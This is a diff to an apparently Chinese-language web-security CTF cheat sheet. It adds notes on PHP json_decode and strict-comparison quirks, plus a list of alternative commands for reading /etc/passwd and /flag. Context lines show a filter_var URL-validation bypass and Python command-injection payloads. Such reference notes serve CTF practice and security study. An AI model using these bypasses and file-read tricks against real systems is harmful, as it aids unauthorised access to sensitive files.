@@ -521,6 +521,17 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
     - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
         - True
 
+- json_decode
+    - 不直接吃換行字元和\t字元
+    - 但可以吃'\n'和'\t'
+        - 會轉成換行字元和Tab
+
+- === bug
+    - `var_dump([0 => 0] === [0x100000000 => 0])`
+        - 某些版本會是True
+        - ASIS 2018 Qual Nice Code
+    - https://3v4l.org/sUEMG
+
 # Command Injection
 
 ```
@@ -621,6 +632,15 @@ pop graphic-context
 - `eval("__import__('os').system('ls')")`
 - `exec("__import__('os').system('ls')")`
 - `commands.getoutput('ls')`
+
+## Read File
+
+- diff /etc/passwd /flag
+- paste /flag
+- bzmore /flag
+- bzless /flag
+- static-sh /flag
+- ...
 
 # SQL Injection
 
